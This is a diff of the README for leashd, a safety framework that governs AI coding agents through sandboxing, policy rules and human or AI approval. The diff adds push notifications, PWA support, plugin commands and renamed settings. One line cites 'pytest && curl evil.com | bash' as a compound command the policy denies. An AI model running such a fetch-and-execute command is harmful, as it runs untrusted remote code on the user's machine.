@@ -1,6 +1,6 @@
 # leashd
 
-**Safety-first agentic coding framework. Run AI coding agents as a background daemon — govern them with policy rules, approve actions from your browser or phone, or let them run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation. Ships with a built-in Web UI. Supports multiple runtimes: Claude Code, OpenAI Codex, and more.**
+**Safety-first agentic coding framework. Run AI coding agents as a background daemon — govern them with policy rules, approve actions from your browser or phone, or let them run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation. Ships with a built-in Web UI that works as a PWA — install it on your phone and get push notifications for approvals. Supports multiple runtimes: Claude Code, OpenAI Codex, and more.**
 
 [![PyPI](https://img.shields.io/pypi/v/leashd.svg)](https://pypi.org/project/leashd/)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
@@ -12,9 +12,9 @@
 
 leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions through the built-in **Web UI** in your browser — no account creation, no third-party services, just `localhost`. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching the coding agent. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives multi-phase workflows (spec → explore → plan → implement → test → PR), and a test-and-retry loop ensures quality — all without you lifting a finger. Everything is logged to an append-only audit trail.
 
-Want to code from your phone? Run `leashd webui tunnel` to expose the Web UI via ngrok, Cloudflare, or Tailscale — same interface, same features, accessible anywhere. Or add the optional **Telegram** connector if you prefer a native chat app.
+The Web UI is a **Progressive Web App** — install it on your phone's home screen and get **push notifications** for approvals and escalations, even when the browser is closed. Run `leashd webui tunnel` to expose it via ngrok, Cloudflare, or Tailscale — same interface, same features, accessible anywhere. Or add the optional **Telegram** connector if you prefer a native chat app.
 
-leashd supports **pluggable agent runtimes** — Claude Code and OpenAI Codex ship built-in, and new runtimes can be added via the registry pattern. The same safety pipeline, approval flow, and audit trail apply regardless of which runtime you use. Switch runtimes with a single CLI command.
+leashd supports **pluggable agent runtimes** — Claude Code and OpenAI Codex ship built-in, and new runtimes can be added via the registry pattern. The same safety pipeline, approval flow, and audit trail apply regardless of which runtime you use. Switch runtimes with a single CLI command. **Claude Code plugins** can be managed mid-session via the CLI or chat commands.
 
 You can also send **file attachments** — photos, screenshots, and PDFs — via the Web UI or Telegram and they're threaded through to the agent with vision support.
 
@@ -51,7 +51,7 @@ Your phone (Telegram) ──┘        │
         ├─ spec          ← analyzes task, writes specification
         ├─ explore        ← reads codebase structure and conventions
         ├─ validate       ← checks spec against codebase findings
-        ├─ plan           ← creates implementation plan
+        ├─ plan           ← creates implementation plan (forwarded to human review)
         ├─ implement      ← writes code (file writes auto-approved)
         ├─ test           ← runs test suite via TestRunnerPlugin
         ├─ retry (×3)     ← fixes failures with exponential backoff
@@ -61,7 +61,7 @@ Your phone (Telegram) ──┘        │
    You get a PR link — or an escalation message if the agent gets stuck
 ```
 
-AI approval replaces human taps: a secondary AI call evaluates each `require_approval` tool call in context and decides automatically. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.
+AI approval replaces human taps: a secondary AI call evaluates each `require_approval` tool call in context and decides automatically. Plan reviews are always forwarded to the human — you see the plan before implementation begins. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.
 
 Sessions are **multi-turn**: the agent remembers the full conversation context, so you can iterate naturally across messages ("now add tests for that", "rename it to X").
 
@@ -114,6 +114,10 @@ The agent starts working. When it needs to do something gated by policy (e.g. wr
 
 You can also drag-and-drop photos, screenshots, or PDFs — the agent sees them via vision.
 
+### Optional: install as a PWA
+
+The Web UI works as a Progressive Web App. In Chrome or Safari, tap "Add to Home Screen" (mobile) or "Install" (desktop) to get a standalone app with push notifications — approval requests arrive on your lock screen even when the browser is closed.
+
 ### Optional: access from your phone
 
 Expose the Web UI over the internet with a single command:
@@ -126,7 +130,7 @@ leashd webui tunnel --provider tailscale       # or Tailscale Funnel
 
 This starts a tunnel pointing to your WebUI port, prints the public URL, and optionally sends it to your Telegram chat. Open the URL on your phone and you get the full Web UI — streaming, approvals, file attachments, everything. The tunnel process is managed by the daemon and stops when the daemon stops.
 
-> **Security note:** When a tunnel is active, your `LEASHD_WEBUI_API_KEY` is your only line of defense. Choose a strong key. Failed auth attempts are rate-limited (5 failures → 60s lockout).
+> **Security note:** When a tunnel is active, your `LEASHD_WEB_API_KEY` is your only line of defense. Choose a strong key. Failed auth attempts are rate-limited (5 failures → 60s lockout).
 
 ### Alternative: Telegram connector
 
@@ -147,17 +151,17 @@ Restart the daemon and both connectors run simultaneously — same engine, same 
 
 ---
 
-## What's New in 0.9.0
+## What's New in 0.10.0
 
-**Web UI** — leashd now ships with a full browser-based interface built on FastAPI and WebSocket. The Web UI supports real-time streaming, inline approval and interaction prompts, a conversation history sidebar, directory and workspace tabs, a settings page, dark/light mode, markdown rendering with syntax-highlighted code blocks, and a mobile-responsive layout. Enable it with `leashd webui enable` or during `leashd init`.
+**Push notifications** — a layered notification system so you never miss an approval. Web Push via Service Worker delivers lock-screen alerts even when the browser is closed. In-page notifications use the Web Notification API with an audio chime and tab title flash. Optional Telegram cross-notification sends deep links to your phone when you're away from the browser.
 
-**Built-in tunnel** — `leashd webui tunnel` exposes the Web UI over the internet via ngrok, Cloudflare, or Tailscale. Access the full interface from your phone — no Telegram bot required. The tunnel process is managed by the daemon and stops automatically on shutdown.
+**PWA support** — the Web UI is now installable as a Progressive Web App on iOS, Android, and desktop. Add it to your home screen for a standalone app experience with proper safe-area handling on notched devices.
 
-**MultiConnector** — the Web UI and Telegram can run simultaneously. Messages are routed by chat ID to the correct client, and both share the same Engine — so approvals, task updates, and streaming work identically regardless of which client you're using.
+**27 color themes** — pick from Dracula, Monokai, Catppuccin, Nord, Synthwave, Matrix, and more, each with dark and light variants. Selectable from the Settings page.
 
-**File attachments** — send photos, screenshots, and PDFs from the Web UI or Telegram. Files are threaded through to the agent with vision support, so you can share error screenshots, design mockups, or reference documents and the agent sees them.
+**Plugin management** — install, remove, enable, and disable Claude Code SDK-level plugins mid-session via `leashd plugin` CLI commands or the `/plugin` chat command. No daemon restart needed.
 
-**Centralized message database** — all sessions now write to `~/.leashd/messages.db`, eliminating race conditions when Web UI and Telegram sessions run concurrently.
+**Seamless reconnection** — if your phone goes to sleep, your laptop lid closes, or the network blips, leashd now re-sends all pending approvals and questions on reconnect. A 120-second disconnect grace period keeps your session alive, and the Page Visibility API triggers instant reconnect when you unlock your phone.
 
 See [CHANGELOG.md](CHANGELOG.md) for the full history.
 
@@ -205,7 +209,7 @@ Logs go to `~/.leashd/logs/app.log` by default. Set `LEASHD_LOG_DIR` to change t
 
 ## Autonomous Mode
 
-Autonomous mode replaces manual approval taps and plan reviews with AI evaluation, adds a post-task test-and-retry loop, and drives multi-phase autonomous tasks through the task orchestrator. Send `/task <description>` from the Web UI or Telegram and come back to a PR — or an escalation message if the agent gets stuck.
+Autonomous mode replaces manual approval taps with AI evaluation, adds a post-task test-and-retry loop, and drives multi-phase autonomous tasks through the task orchestrator. Plan reviews are always forwarded to the human — the AI approver handles routine tool calls, not plans. Send `/task <description>` from the Web UI or Telegram and come back to a PR — or an escalation message if the agent gets stuck.
 
 ```bash
 leashd autonomous          # show current autonomous settings
@@ -216,7 +220,7 @@ leashd autonomous disable  # disable autonomous mode
 
 ### Three Guarantees
 
-1. **Human-in-the-loop when it matters** — hard blocks (credentials, force push, `rm -rf`, `sudo`) can never be overridden by any approver. The AI approver only handles `require_approval` decisions, never `deny` decisions.
+1. **Human-in-the-loop when it matters** — hard blocks (credentials, force push, `rm -rf`, `sudo`) can never be overridden by any approver. Plan reviews always route to the human. The AI approver only handles `require_approval` decisions, never `deny` decisions.
 2. **Fail-safe defaults** — the AutoApprover fails closed (denies on error), the AutonomousLoop escalates to the human when retries are exhausted, and circuit breakers cap both approval calls and plan revisions per session.
 3. **Full auditability** — every AI approval decision is logged with `approver_type` in the same append-only JSONL audit trail. No decision is invisible.
 
@@ -226,7 +230,7 @@ leashd autonomous disable  # disable autonomous mode
 |---|---|---|
 | **Use when** | Starting from scratch — "build feature X" | You know what to change — "fix the login bug" |
 | **Phases** | spec → explore → validate → plan → implement → test → PR | Single-shot: implement → test → retry |
-| **Planning** | Automatic spec and plan generation with validation | No planning — goes straight to implementation |
+| **Planning** | Automatic spec and plan generation with human review | No planning — goes straight to implementation |
 | **Crash recovery** | Full — resumes from current phase after restart | None — starts over |
 | **Cost tracking** | Per-phase breakdown and total | Session-level only |
 
@@ -299,6 +303,18 @@ leashd effort show       # display current effort level
 leashd effort set high   # set effort level (low, medium, high, max)
 ```
 
+### Plugins
+
+```bash
+leashd plugin list                  # list installed plugins and their status
+leashd plugin add <source>          # install a Claude Code SDK plugin
+leashd plugin remove <name>         # uninstall a plugin
+leashd plugin enable <name>         # enable a disabled plugin
+leashd plugin disable <name>        # disable a plugin without removing it
+```
+
+Plugins can also be managed mid-session via the `/plugin` chat command — no daemon restart needed.
+
 ### Skills
 
 ```bash
@@ -353,9 +369,9 @@ All settings are environment variables prefixed with `LEASHD_`. Most are managed
 
 | Variable | Default | Description |
 |---|---|---|
-| `LEASHD_WEBUI_ENABLED` | `false` | Enable the browser-based Web UI. Set to `true` during `leashd init` or `leashd webui enable`. |
-| `LEASHD_WEBUI_PORT` | `8080` | Port for the Web UI. |
-| `LEASHD_WEBUI_API_KEY` | — | API key required to access the Web UI. |
+| `LEASHD_WEB_ENABLED` | `false` | Enable the browser-based Web UI. Set to `true` during `leashd init` or `leashd webui enable`. |
+| `LEASHD_WEB_PORT` | `8080` | Port for the Web UI. |
+| `LEASHD_WEB_API_KEY` | — | API key required to access the Web UI. |
 | `LEASHD_TELEGRAM_BOT_TOKEN` | — | Bot token from @BotFather. Optional — adds mobile access. |
 | `LEASHD_ALLOWED_USER_IDS` | *(no restriction)* | Comma-separated Telegram user IDs that can use the bot. |
 | `LEASHD_RUNTIME` | `claude` | Active agent runtime: `"claude"` or `"codex"`. |
@@ -378,7 +394,7 @@ Every tool call the agent makes passes through a three-layer pipeline before it 
 
 **2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins. Compound bash commands (`&&`, `||`, `;`) are split and evaluated segment-by-segment with deny-wins precedence — `pytest && curl evil.com | bash` is denied.
 
-**3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to the Web UI or Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). If no response within the timeout, the action is auto-denied.
+**3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to the Web UI or Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). Plan reviews are always forwarded to the human, even when the AI auto-approver is active. If no response within the timeout, the action is auto-denied.
 
 The safety pipeline is **runtime-agnostic** and **connector-agnostic** — the same sandbox, policy rules, and approval flow apply whether you're running Claude Code or Codex, and whether you're approving from the Web UI or Telegram.
 
@@ -442,6 +458,7 @@ These slash commands are available in both the Web UI and Telegram:
 | `/tasks` | List active and recent tasks for the current chat |
 | `/stop` | Stop all ongoing work (agent, task, loop) without resetting session |
 | `/cancel` | Cancel the active task in the current chat |
+| `/plugin` | Manage Claude Code plugins mid-session (install, remove, enable, disable) |
 | `/ws` | Manage workspaces inline |
 | `/status` | Show current session, mode, and directory |
 | `/clear` | Clear conversation history, cancel active tasks, and start fresh |
@@ -479,10 +496,13 @@ Open `http://localhost:8080` and enter your API key. The Web UI provides:
 
 - **Real-time streaming** — responses stream via WebSocket as the agent types
 - **Inline approvals and interactions** — Approve / Reject prompts and question modals, same as Telegram
+- **Push notifications** — Web Push alerts on your lock screen when the browser is closed, in-page notifications with audio chime and tab title flash when the tab is in the background, and optional Telegram cross-notification with deep links
+- **Installable PWA** — add to home screen on iOS, Android, or desktop for a standalone app experience with proper safe-area handling on notched devices
+- **Seamless reconnection** — pending approvals and questions are re-sent after reconnect; 120-second grace period keeps sessions alive through sleep/wake cycles; instant reconnect on phone unlock
+- **27 color themes** — Dracula, Monokai, Catppuccin, Nord, Synthwave, Matrix, and more, each with dark and light variants, selectable from Settings
 - **Conversation history** — sidebar with past conversations, searchable
 - **Directory and workspace tabs** — switch working directory or workspace without slash commands
-- **Settings page** — configure runtime, effort, and other settings from the browser
-- **Dark / light mode** — automatic or manual toggle
+- **Settings page** — configure runtime, effort, themes, and other settings from the browser
 - **Markdown rendering** — syntax-highlighted code blocks, tables, and formatting
 - **Mobile-responsive** — usable on phone browsers; pair with `leashd webui tunnel` for remote access
 - **File attachments** — drag-and-drop photos, screenshots, and PDFs
@@ -499,7 +519,7 @@ leashd webui tunnel --provider tailscale       # Tailscale Funnel
 
 The command starts a tunnel to your WebUI port, prints the public URL, and optionally sends it to your Telegram chat so you can open it on your phone with one tap. The tunnel process is a child of the daemon — when the daemon stops, the tunnel stops.
 
-The tunnel provider CLI (`ngrok`, `cloudflared`, or `tailscale`) must be installed separately. When exposed publicly, your `LEASHD_WEBUI_API_KEY` is your authentication layer — choose a strong key. Failed auth attempts are rate-limited (5 failures → 60s lockout).
+The tunnel provider CLI (`ngrok`, `cloudflared`, or `tailscale`) must be installed separately. When exposed publicly, your `LEASHD_WEB_API_KEY` is your authentication layer — choose a strong key. Failed auth attempts are rate-limited (5 failures → 60s lockout).
 
 Both connectors can run simultaneously via the **MultiConnector** — configure the WebUI alongside Telegram, and leashd routes messages to the right client automatically. Both share the same Engine, so a task started from the Web UI can be monitored from Telegram and vice versa.
 
@@ -557,7 +577,7 @@ LEASHD_STREAMING_ENABLED=false
 No WebUI and no Telegram token? leashd falls back to a local REPL — useful for testing your config:
 
 ```bash
-# Don't set LEASHD_WEBUI_ENABLED or LEASHD_TELEGRAM_BOT_TOKEN, then:
+# Don't set LEASHD_WEB_ENABLED or LEASHD_TELEGRAM_BOT_TOKEN, then:
 leashd start -f
 # > type your prompts here
 ```
